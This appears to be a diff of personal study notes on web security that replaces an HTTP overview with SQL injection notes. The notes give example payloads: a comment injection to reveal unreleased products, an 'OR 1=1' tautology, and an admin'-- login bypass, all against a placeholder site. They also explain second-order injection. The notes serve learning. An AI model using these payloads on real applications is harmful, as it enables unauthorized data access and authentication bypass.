@@ -3,29 +3,48 @@
 #                                                                             #
 ###############################################################################
 
-Web Application Technologies
-
 _______________________________________________________________________________
-The HTTP Protocol
-	- HTTP uses a message-based model where client sends request message and server
-		returns a response message
-	- Protocol is essentially connectionless (each request and response pair is 
-		treated as an independent transaction, and may use a different TCP connection
+SQL Injection
+URL parameters may be modified to change SQL query
 
-	HTTP Requests
-		<method> <requested url> <HTTP version>
-		...
-		<referer>
-		<User-Agent>
+First-Order SQL Injection
+	The application processes user input from an HTTP request and incorporates the
+	input into a SQL query in an unsafe way.
 
-	HTTP Responses
-		<HTTP version> <numeric status code - result of request> <reason status>
-		...
-		<message body>
-		<content length>
+Retrieving Hidden Data Example
+	Original 
+		https://insecure-website.com/products?category=Gifts
+	SQL Query
+		SELECT * FROM products WHERE category = 'Gifts' AND released = 1
+	To get unreleased products, we can add a comment
+		https://insecure-website.com/products?category=Gifts'--
+	SQL Query:
+		SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
+	The comment -- means that the rest of the SQL query is ignored thus 
+	AND released = 1 does not get processed
 
-	HTTP Methods
-		GET Method: retrieve resources, can be used to send parameters to request 
-			resource in the URL query string
-		POST Method: perform actions, request parameters can be sent both in the 
-			URL query string and in the body of message
+	To display all products in any category, we can add a tautology
+		https://insecure-website.com/products?category=Gifts'+OR+1=1--
+	SQL Query:
+		SELECT * FROM products WHERE category = 'Gifts' OR 1=1 --' AND released = 1
+
+	' is a string delimeter
+	-- is a comment
+
+Subverting Application Logic
+	If an app takes username and password, username parameter for SQL query can 
+	be modified with:
+		admin'--
+	SQL Query:
+		SELECT * FROM users WHERE username = 'admin'--' AND password = ''
+	This skips the password authentication 
+
+
+Second-Order SQL Injection
+	The application takes user input from an HTTP request and stores it for future
+	use. Usually done by placing the input into a db, but no vulnerability occurs
+	at the point where the data is stored. Later when handling a different HTTP 
+	request, the app retrieves the stored data and incorporates it into a SQL query
+	in an unsafe way
+
+
